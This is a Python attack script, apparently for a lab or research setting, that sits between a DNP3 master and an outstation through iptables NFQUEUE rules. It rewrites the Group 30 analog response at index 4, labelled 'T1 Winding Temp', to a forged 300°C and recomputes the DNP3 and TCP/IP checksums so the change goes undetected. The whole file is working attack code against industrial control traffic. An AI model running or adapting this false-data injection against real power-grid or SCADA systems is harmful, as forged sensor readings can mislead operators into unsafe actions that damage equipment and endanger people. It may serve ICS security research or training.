"""
--- setup (run before this script) ---
sudo iptables -I FORWARD -p tcp --sport 20000 -j NFQUEUE --queue-num 0
sudo iptables -I FORWARD -p tcp --dport 20000 -j NFQUEUE --queue-num 0

--- cleanup (run after Ctrl+C) ---
sudo iptables -D FORWARD -p tcp --sport 20000 -j NFQUEUE --queue-num 0
sudo iptables -D FORWARD -p tcp --dport 20000 -j NFQUEUE --queue-num 0
"""

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import struct

# ============================================================
# config
# ============================================================
FAKE_VALUE = 300   # degrees C to inject as T1 Winding Temp

# ============================================================
# DNP3 CRC-16
# ============================================================
DNP3_CRC_POLY = 0xA6BC

def dnp3_crc(data: bytes) -> int:
    crc = 0x0000
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ DNP3_CRC_POLY if crc & 1 else crc >> 1
    return (~crc) & 0xFFFF

_crc_checked = False

def check_crc(data: bytes, expected: bytes, label: str) -> bool:
    global _crc_checked
    computed = dnp3_crc(data)
    expected_val = struct.unpack("<H", expected)[0]
    ok = computed == expected_val
    if not _crc_checked:
        print(f"[*] CRC self-check ({label}): {'OK' if ok else 'MISMATCH — tampering will corrupt frames'}")
        _crc_checked = True
    return ok

# ============================================================
# DNP3 link layer parser
# ============================================================
class LinkFrame:
    def __init__(self):
        self.total_len = 0
        self.user_data = b""
        # list of (local_off_in_userdata, block_data_len, block_start_pos_in_raw)
        self.block_map = []

def parse_link_frame(buf: bytes, offset: int):
    if offset + 10 > len(buf) or buf[offset] != 0x05 or buf[offset+1] != 0x64:
        return None
    length = buf[offset+2]
    if length < 5:
        return None
    check_crc(buf[offset:offset+8], buf[offset+8:offset+10], "link header")
    user_data_len = length - 5
    pos = offset + 10
    remaining = user_data_len
    user_data = bytearray()
    block_map = []
    while remaining > 0:
        blen = min(16, remaining)
        if pos + blen + 2 > len(buf):
            return None
        check_crc(buf[pos:pos+blen], buf[pos+blen:pos+blen+2], "data block")
        block_map.append((len(user_data), blen, pos))
        user_data.extend(buf[pos:pos+blen])
        pos += blen + 2
        remaining -= blen
    frame = LinkFrame()
    frame.total_len = pos - offset
    frame.user_data = bytes(user_data)
    frame.block_map = block_map
    return frame

def find_frames(buf: bytes):
    frames = []
    offset = 0
    while offset < len(buf) - 1:
        if buf[offset] == 0x05 and buf[offset+1] == 0x64:
            frame = parse_link_frame(buf, offset)
            if frame:
                frames.append(frame)
                offset += frame.total_len
                continue
        offset += 1
    return frames

# ============================================================
# Tamper: find G30V1 block and patch idx4 in place
# ============================================================
def find_and_tamper(raw: bytes):
    """
    Scan every link frame in this TCP segment for the G30V1 static analog
    block (1e 01 00 00 07). If found, overwrite idx4's 4-byte value with
    FAKE_VALUE and recompute all affected CRC blocks.
    Returns (new_raw_bytes, was_modified).
    """
    buf = bytearray(raw)
    modified = False

    for frame in find_frames(raw):
        ud = frame.user_data

        # Scan for G30 Var 1 Qual 0x00 start=0 stop=7
        for i in range(len(ud) - 4):
            if (ud[i]   == 0x1e and   # Group 30
                ud[i+1] == 0x01 and   # Var 1
                ud[i+2] == 0x00 and   # Qualifier 0x00 (1-byte start/stop)
                ud[i+3] == 0x00 and   # start = 0
                ud[i+4] == 0x07):     # stop = 7 (indices 0-7, 8 points)

                # Layout within user_data from offset i:
                #   GVQ (3) + start/stop (2) = 5 bytes header
                #   idx0..3: 4 × 5 bytes = 20 bytes
                #   idx4 flag at i+25, value bytes at i+26..i+29
                val_off = i + 26
                if val_off + 4 > len(ud):
                    continue

                new_val = int(FAKE_VALUE).to_bytes(4, "little", signed=True)

                # Write each byte and record which CRC blocks are touched
                affected = set()
                for k in range(4):
                    abs_off = val_off + k
                    for loc, blen, bpos in frame.block_map:
                        if loc <= abs_off < loc + blen:
                            buf[bpos + (abs_off - loc)] = new_val[k]
                            affected.add((bpos, blen))
                            break

                # Recompute CRC for every affected block
                for bpos, blen in affected:
                    block_data = bytes(buf[bpos:bpos + blen])
                    new_crc = dnp3_crc(block_data).to_bytes(2, "little")
                    buf[bpos + blen: bpos + blen + 2] = new_crc

                modified = True
                print(f"[*] G30V1 idx4 patched → {FAKE_VALUE}°C ({len(affected)} CRC block(s) updated)")
                break  # one G30V1 per link frame is enough

    return bytes(buf), modified

# ============================================================
# NFQUEUE handler — accept every packet immediately, no holding
# ============================================================
def handle(pkt):
    scapy_pkt = IP(pkt.get_payload())

    if not (scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw)):
        pkt.accept()
        return

    tcp = scapy_pkt[TCP]

    # Only outstation→master segments carry G30V1 responses. Everything
    # else (polls, confirms, ACKs) is passed straight through untouched
    # so the handler stays fast and traffic never backs up.
    if tcp.sport != 20000:
        pkt.accept()
        return

    raw = bytes(scapy_pkt[Raw].load)

    # Too short to hold a G30V1 static block — skip the scan entirely.
    if len(raw) < 40:
        pkt.accept()
        return

    new_raw, modified = find_and_tamper(raw)

    if modified:
        scapy_pkt[Raw].load = new_raw
        del scapy_pkt[IP].chksum
        del scapy_pkt[TCP].chksum
        pkt.set_payload(bytes(scapy_pkt))

    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, handle)
print(f"[*] Listening — injecting T1 Winding Temp = {FAKE_VALUE}°C. Ctrl+C to stop.")
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[*] Stopped. Remove iptables rules to restore normal traffic:")
    print("    sudo iptables -D FORWARD -p tcp --sport 20000 -j NFQUEUE --queue-num 0")
    print("    sudo iptables -D FORWARD -p tcp --dport 20000 -j NFQUEUE --queue-num 0")
